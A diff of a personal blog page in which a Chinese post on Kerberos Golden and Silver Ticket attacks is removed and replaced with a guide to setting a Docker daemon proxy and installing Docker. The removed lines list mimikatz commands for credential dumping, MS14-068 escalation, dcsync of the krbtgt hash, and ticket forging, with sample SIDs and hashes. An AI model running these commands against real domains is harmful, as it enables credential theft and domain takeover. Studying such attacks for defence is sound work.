@@ -19,23 +19,25 @@
   <meta name="author" content="lolydawn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="黄金票据和白银票据金票Golden ticket原理  在kerberos认真中，client通过as认证后，拿到了一个logon session key 和tgt 而logon session key并不会保存在kdc中 krbtgt的ntlm hash又是固定的 所以只要拿到krbtgt的ntlm hash就可以伪造tgt和logon session key从而进行下一步与tgs的交互 有了金">
+    <meta name="description" content="随着越来越多的镜像源被墙或者受政策原因下架，似乎docker的使用体验也随之下架，总为了寻找一个合适的镜像源而烦恼，但实际上可以直接设置核心代理从而使用官方镜像源，这样不仅使用体验稳定，而且官方镜像源的更新速度也是最快的。 配置 Docker 使用代理配置 Docker Daemon 使用代理。 假设代理地址为 http:&#x2F;&#x2F;127.0.0.1:7890  创建 Docker systemd 配置">
 <meta property="og:type" content="article">
-<meta property="og:title" content="金票银票总结">
-<meta property="og:url" content="https://lolydawn.github.io/2024/12/12/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="docker如何设置核心代理">
+<meta property="og:url" content="https://lolydawn.github.io/2025/01/13/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/index.html">
 <meta property="og:site_name" content="lolydawn">
-<meta property="og:description" content="黄金票据和白银票据金票Golden ticket原理  在kerberos认真中，client通过as认证后，拿到了一个logon session key 和tgt 而logon session key并不会保存在kdc中 krbtgt的ntlm hash又是固定的 所以只要拿到krbtgt的ntlm hash就可以伪造tgt和logon session key从而进行下一步与tgs的交互 有了金">
+<meta property="og:description" content="随着越来越多的镜像源被墙或者受政策原因下架，似乎docker的使用体验也随之下架，总为了寻找一个合适的镜像源而烦恼，但实际上可以直接设置核心代理从而使用官方镜像源，这样不仅使用体验稳定，而且官方镜像源的更新速度也是最快的。 配置 Docker 使用代理配置 Docker Daemon 使用代理。 假设代理地址为 http:&#x2F;&#x2F;127.0.0.1:7890  创建 Docker systemd 配置">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://lolydawn.github.io/image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png">
-<meta property="article:published_time" content="2024-12-12T11:06:02.000Z">
-<meta property="article:modified_time" content="2025-08-24T07:23:35.286Z">
+<meta property="og:image" content="https://lolydawn.github.io/image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824155723430.png">
+<meta property="og:image" content="https://lolydawn.github.io/image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824160234186.png">
+<meta property="og:image" content="https://lolydawn.github.io/image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824160338441.png">
+<meta property="article:published_time" content="2025-01-13T14:48:43.000Z">
+<meta property="article:modified_time" content="2025-08-24T08:04:11.695Z">
 <meta property="article:author" content="lolydawn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lolydawn.github.io/image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png">
+<meta name="twitter:image" content="https://lolydawn.github.io/image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824155723430.png">
   
   
   
-  <title>金票银票总结 - lolydawn</title>
+  <title>docker如何设置核心代理 - lolydawn</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="金票银票总结"></span>
+            <span id="subtitle" data-typed-text="docker如何设置核心代理"></span>
           
         </div>
 
@@ -212,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-12-12 19:06" pubdate>
-          December 12, 2024 pm
+        <time datetime="2025-01-13 22:48" pubdate>
+          January 13, 2025 pm
         </time>
       </span>
     
@@ -224,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          790 words
+          597 words
         
       </span>
     
@@ -235,7 +237,7 @@
         
         
         
-          7 mins
+          5 mins
         
       </span>
     
@@ -272,110 +274,101 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">金票银票总结</h1>
+            <h1 id="seo-header">docker如何设置核心代理</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h1><h2 id="金票Golden-ticket"><a href="#金票Golden-ticket" class="headerlink" title="金票Golden ticket"></a>金票Golden ticket</h2><p>原理</p>
-<ul>
-<li>在kerberos认真中，client通过as认证后，拿到了一个logon session key 和tgt</li>
-<li>而logon session key并不会保存在kdc中</li>
-<li>krbtgt的ntlm hash又是固定的 所以只要拿到krbtgt的ntlm hash就可以伪造tgt和logon session key从而进行下一步与tgs的交互</li>
-<li>有了金票后，就跳过as验证，不用验证账户和密码，所以也不用担心域管理员密码修改</li>
+                <p>随着越来越多的镜像源被墙或者受政策原因下架，似乎docker的使用体验也随之下架，总为了寻找一个合适的镜像源而烦恼，但实际上可以直接设置核心代理从而使用官方镜像源，这样不仅使用体验稳定，而且官方镜像源的更新速度也是最快的。</p>
+<h2 id="配置-Docker-使用代理"><a href="#配置-Docker-使用代理" class="headerlink" title="配置 Docker 使用代理"></a>配置 Docker 使用代理</h2><p>配置 Docker Daemon 使用代理。</p>
+<p>假设代理地址为 <code>http://127.0.0.1:7890</code></p>
+<ol>
+<li>创建 Docker systemd 配置目录：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>创建代理配置文件：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/systemd/system/docker.service.d/proxy.conf<br></code></pre></td></tr></table></figure>
+
+<p>写入以下内容（根据你的代理地址修改）：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://127.0.0.1:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://127.0.0.1:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>重新加载配置并重启 Docker：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl daemon-reexec<br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure>
+
+<p>重启后 执行 docker search hello</p>
+<p><img src="/../image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824155723430.png" srcset="/img/loading.gif" lazyload alt="image-20250824155723430"></p>
+<p>如图示代表配置成功 可以愉快使用了</p>
+<hr>
+<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ul>
+<li>Vmware虚拟机上的docker如何使用代理</li>
 </ul>
-<p>特点</p>
-<ul>
-<li>不需要和as进行交互，需要krbtgt的hash</li>
-</ul>
-<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>一、伪造凭据，提升域内普通用户的权限</p>
-<ul>
-<li><p>本地administrator用户登录域内的一个主机</p>
-</li>
-<li><p>net config workstation拿到域名</p>
-</li>
-<li><p>nltest &#x2F;dsgetdc:域名 拿到dc主机名</p>
-</li>
-<li><p>上传mimikatz,以管理员权限运行CMD,再去执行mimikatz</p>
-</li>
-</ul>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">可以使用socks的海外proxy链接 这样是最方便快捷的<br>在宿主机上使用一些有tun模式（允许局域网设备连接）的代理软件后，直接填可达的宿主机地址与端口即可<br>使用proxifier之类的软件 直接强行走宿主机上的代理端口 这样核心代理都不用设置了<br></code></pre></td></tr></table></figure>
 
 <ul>
-<li><p>拿到域内用户名和密码</p>
-</li>
-<li><p>登陆域账号</p>
-</li>
-<li><p>尝试提权 域内普通用户提权成功后是有时效性的</p>
-</li>
-<li><p>whoami &#x2F;user 或者 whoami&#x2F;all 查看该域用户的suid</p>
-</li>
-<li><p>上传mimikatz和MS-068提权工具</p>
-</li>
-<li><p>使用MS14-068伪造票据，会在当前目录下生成一个凭证</p>
-</li>
+<li>linux服务器如何使用代理</li>
 </ul>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -<span class="hljs-selector-tag">p</span> 域成员密码 -s 域成员sid -d 域控制器地址 <br></code></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">有很多代理软件，例如clash等 都是有linux版本的 自行搜索即可<br></code></pre></td></tr></table></figure>
 
 <ul>
-<li>使用mimikatz清空之前缓存的凭证，导入伪造的凭证</li>
+<li><strong>权限不足（非 root 用户运行 docker）</strong></li>
 </ul>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge  <span class="hljs-comment">//清空票据</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件地址</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br>newgrp docker<br></code></pre></td></tr></table></figure>
 
 <ul>
-<li>然后拿到域管的权限</li>
+<li><strong>代理只想临时生效</strong></li>
 </ul>
-<p>二、伪造金票</p>
-<p>条件</p>
-<ul>
-<li>域名称</li>
-<li>域的SID值</li>
-<li>域的KRBTGT账号的HASH</li>
-<li>伪造任意用户名</li>
-</ul>
-<p>mimikatz导出krbtgt的hash</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mimikatz(commandline) # privilege::<span class="hljs-keyword">debug</span><br>mimikatz(commandline) # lsadump::dcsync /<span class="hljs-keyword">domain</span>:cyberpeace.com /<span class="hljs-keyword">all</span> /csv<br>mimikatz(commandline) # lsadump::dcsync /<span class="hljs-keyword">domain</span>:cyberpeace.com /<span class="hljs-keyword">user</span>:krbtgt<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> HTTP_PROXY=http://127.0.0.1:7890<br><span class="hljs-built_in">export</span> HTTPS_PROXY=http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png" srcset="/img/loading.gif" lazyload alt="image-20241128152659240"></p>
-<p>之后可以看到krbtgt用户的SID</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /admin:system /domain:cyberpeace.com /sid:S-1-5-21-97341123-1865264218-933115267 /krbtgt:95972cdf7b8dde854e74c1871f6d80a0 /ticket:ticket.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br><br>/admin：伪造的用户名<br>/domain：域名称<br>/sid：SID值，注意是去掉最后一个-后面的值<br>/krbtgt：krbtgt的HASH值<br><span class="hljs-regexp">/ticket：生成的票据名称    /</span>/不是写入内存中的命令！<br></code></pre></td></tr></table></figure>
+<h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><ol>
+<li>更新 apt 包索引并安装依赖：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install -y apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release<br></code></pre></td></tr></table></figure>
 
-<p>金票的使用</p>
-<p>登陆普通用户，通过mimikatz的kerberos::ptt功能将ticket.kirbi导入内存中</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># kerberos::purge         </span><br>mimikatz <span class="hljs-comment"># kerberos::ptt ticket.kirbi</span><br></code></pre></td></tr></table></figure>
+<ol>
+<li>添加 Docker 官方 GPG 密钥：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg<br></code></pre></td></tr></table></figure>
 
-<h2 id="银票据"><a href="#银票据" class="headerlink" title="银票据"></a>银票据</h2><p>伪造的ST</p>
-<p>在kerberos第三步的时候，Server接收到client的请求之后，通过自己的Master Key解密ST，从而获得Session Key。</p>
-<p>通过session key解密Authenticator3 进而验证对方的身份，验证成功就让client访问指定服务了。</p>
-<p>特点</p>
-<ul>
-<li>不需要与KDC进行交互</li>
-<li>需要server的NTLM hash</li>
-</ul>
-<p>同黄金票据流程</p>
-<p>登录上面创建的域管用户，用管理员权限打开CMD，cd 到 mimikatz 存放的目录，去执行mimikatz的命令，得到SID和NTLM</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure>
+<ol>
+<li>添加 Docker 官方仓库：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> \<br>  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] \</span><br><span class="hljs-string">  https://download.docker.com/linux/ubuntu \</span><br><span class="hljs-string">  <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | \<br>  <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br></code></pre></td></tr></table></figure>
 
-<p>先使用mimikatz清空票据，再导入伪造的票据,具体伪造票据的</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /domain:cyberpeace.com /sid:S-1-5-21-2718660907-658632824-2072795563 /target:scene.cyberpeace.com /service:cifs /rc4:9a68826fdc2811f20d1f73a471ad7b9a /user:<span class="hljs-built_in">test</span> /ptt<br></code></pre></td></tr></table></figure>
+<ol>
+<li>安装 Docker 引擎：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install -y docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure>
 
-<h2 id="金票与银票的区别"><a href="#金票与银票的区别" class="headerlink" title="金票与银票的区别"></a>金票与银票的区别</h2><ul>
-<li>获取的权限不同<ul>
-<li>金票：伪造的TGT，可以获取任意Kerberos的访问权限</li>
-<li>银票：伪造的ST，只能访问指定的服务，如CIFS</li>
-</ul>
-</li>
-<li>认证流程不同<ul>
-<li>金票：同KDC交互，但不同AS交互</li>
-<li>银票：不同KDC交互，直接访问Server</li>
-</ul>
-</li>
-<li>加密方式不同<ul>
-<li>金票：由krbtgt NTLM Hash加密</li>
-<li>银票：由服务账号 NTLM Hash加密</li>
-</ul>
-</li>
-</ul>
+<ol>
+<li>验证安装：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker --version<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/../image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824160234186.png" srcset="/img/loading.gif" lazyload alt="image-20250824160234186"></p>
+<h2 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker Compose"></a>安装 Docker Compose</h2><ol>
+<li>下载最新版本 Docker Compose（以 v2.27.0 为例）：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">DOCKER_COMPOSE_VERSION=v2.27.0<br><span class="hljs-built_in">sudo</span> curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_VERSION&#125;</span>/docker-compose-<span class="hljs-subst">$(uname -s)</span>-<span class="hljs-subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>添加执行权限：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /usr/local/bin/docker-compose<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>验证安装：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/../image/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/image-20250824160338441.png" srcset="/img/loading.gif" lazyload alt="image-20250824160338441"></p>
+<p>出现使用帮助提示即代表安装完成</p>
 
                 
               </div>
@@ -393,8 +386,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>金票银票总结</div>
-      <div>https://lolydawn.github.io/2024/12/12/金票银票总结/</div>
+      <div>docker如何设置核心代理</div>
+      <div>https://lolydawn.github.io/2025/01/13/docker如何设置核心代理/</div>
     </div>
     <div class="license-meta">
       
@@ -406,7 +399,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>December 12, 2024</div>
+          <div>January 13, 2025</div>
         </div>
       
       
@@ -438,9 +431,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/13/docker%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%90%86/" title="docker如何设置核心代理">
+                      <a href="/2025/01/22/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/" title="正反向代理总结">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">docker如何设置核心代理</span>
+                        <span class="hidden-mobile">正反向代理总结</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -448,8 +441,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" title="Linux提权总结">
-                        <span class="hidden-mobile">Linux提权总结</span>
+                      <a href="/2024/12/12/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8%E6%80%BB%E7%BB%93/" title="金票银票总结">
+                        <span class="hidden-mobile">金票银票总结</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
